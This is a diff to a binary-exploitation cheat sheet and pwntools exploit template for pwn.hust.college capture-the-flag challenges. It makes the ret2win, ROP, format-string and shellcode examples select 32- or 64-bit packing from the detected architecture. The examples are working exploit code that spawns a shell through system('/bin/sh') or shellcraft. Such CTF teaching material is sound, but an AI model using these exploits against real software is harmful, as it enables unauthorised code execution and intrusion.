@@ -181,16 +181,18 @@ Quick-reference catalog for identifying common binary exploitation vulnerabiliti
 
 **Exploit strategy:**
 1. Find offset to return address (pattern create + pattern offset, or calculate from buffer size + saved rbp)
-2. Pack address of win function (little-endian, 64-bit addresses)
+2. Pack address of win function with `p32` or `p64` according to detected `elf.bits`
 3. If PIE enabled, need a leak first; if no PIE, address is fixed
 
 **Example:**
 ```python
 from pwn import *
-p = process('/challenge/solve')
+elf = ELF('/challenge/solve')
+context.binary = elf
+p = process(elf.path)
 offset = 40  # determined by pattern offset
 win_addr = 0x401236  # from objdump
-payload = b'A' * offset + p64(win_addr)
+payload = b'A' * offset + (p64(win_addr) if elf.bits == 64 else p32(win_addr))
 p.sendline(payload)
 p.interactive()
 ```
@@ -204,16 +206,19 @@ p.interactive()
 - Need to call `system("/bin/sh")` or `execve`
 
 **Exploit strategy:**
-1. Find `pop rdi; ret` gadget: `ROPgadget --binary /challenge/solve | grep "pop rdi"`
-2. Find address of `system@plt` (from objdump) or `/bin/sh` string in binary
-3. Build chain: `padding + pop_rdi + binsh_addr + system_addr`
-4. If no `/bin/sh` string in binary, write it to a known writable address (bss) via `gets` or `read`
+1. Determine architecture and calling convention from `elf.arch`
+2. Find architecture-appropriate gadgets with pwntools `ROP(elf)`, `ROPgadget`, or `ropper`
+3. Find address of `system@plt` (from objdump) or `/bin/sh` string in binary
+4. Build the chain using the detected architecture; `pop rdi; ret` is amd64-only and is not valid for ARM
+5. If no `/bin/sh` string in binary, write it to a known writable address (bss) via `gets` or `read`
 
 **Example:**
 ```python
 from pwn import *
 elf = ELF('/challenge/solve')
+context.binary = elf
 rop = ROP(elf)
+# amd64 example only; choose different gadgets/calling convention on ARM.
 pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
 binsh = next(elf.search(b'/bin/sh'))
 payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(elf.plt['system'])
@@ -235,7 +240,8 @@ payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(elf.plt['system'])
 ```python
 from pwn import *
 elf = ELF('/challenge/solve')
-p = process('/challenge/solve')
+context.binary = elf
+p = process(elf.path)
 writes = {elf.got['puts']: elf.symbols['win']}
 payload = fmtstr_payload(offset, writes)
 p.sendline(payload)
@@ -250,17 +256,19 @@ p.sendline(payload)
 
 **Exploit strategy:**
 1. Find address of buffer (leak or fixed)
-2. Generate shellcode: `shellcraft.sh()` for x86_64 Linux
-3. Jump to shellcode (overwrite return address or use `jmp rsp`/`call rax` gadget)
+2. Generate shellcode with `context.binary = elf` so `shellcraft.sh()` uses the detected architecture
+3. Jump to shellcode with an architecture-appropriate branch/gadget
 
 **Example:**
 ```python
 from pwn import *
-context.arch = 'amd64'
+elf = ELF('/challenge/solve')
+context.binary = elf
 shellcode = asm(shellcraft.sh())
-p = process('/challenge/solve')
+p = process(elf.path)
 buf_addr = 0x7fffffffde00  # from leak or fixed
-payload = shellcode + b'A' * (offset - len(shellcode)) + p64(buf_addr)
+payload = shellcode + b'A' * (offset - len(shellcode))
+payload += p64(buf_addr) if elf.bits == 64 else p32(buf_addr)
 p.sendline(payload)
 p.interactive()
 ```
@@ -409,9 +417,7 @@ pwntools exploit template for pwn.hust.college challenges.
 Adapt this template based on vulnerability analysis.
 
 Usage:
-  python3 exploit_template.py [REMOTE|LOCAL]
-    LOCAL  - test against local binary (default)
-    REMOTE - run against /challenge/solve on the remote host
+  python3 exploit_template.py
 """
 
 from pwn import *
@@ -420,10 +426,14 @@ BINARY = '/challenge/solve'
 HOST = 'localhost'
 PORT = 0  # 0 means use process() instead of remote()
 
-context.arch = 'amd64'
 context.log_level = 'debug'
 
 elf = ELF(BINARY)
+context.binary = elf
+
+
+def pack_addr(addr):
+    return p64(addr) if elf.bits == 64 else p32(addr)
 
 
 def get_target():
@@ -440,14 +450,16 @@ def main():
     #
     # RET2WIN:
     #   offset = 40  # find with cyclic(100) + cyclic_find
-    #   payload = b'A' * offset + p64(elf.symbols['win'])
+    #   payload = b'A' * offset + pack_addr(elf.symbols['win'])
     #   p.sendline(payload)
     #
     # ROP:
     #   rop = ROP(elf)
+    #   # Select gadgets/calling convention for elf.arch.
+    #   # Example below is amd64-only:
     #   pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
     #   binsh = next(elf.search(b'/bin/sh'))
-    #   payload = b'A' * offset + p64(pop_rdi) + p64(binsh) + p64(elf.plt['system'])
+    #   payload = b'A' * offset + pack_addr(pop_rdi) + pack_addr(binsh) + pack_addr(elf.plt['system'])
     #   p.sendline(payload)
     #
     # FORMAT STRING:
@@ -456,7 +468,7 @@ def main():
     #
     # SHELLCODE:
     #   shellcode = asm(shellcraft.sh())
-    #   payload = shellcode.ljust(offset, b'A') + p64(buf_addr)
+    #   payload = shellcode.ljust(offset, b'A') + pack_addr(buf_addr)
     #   p.sendline(payload)
     # =======================================================
 
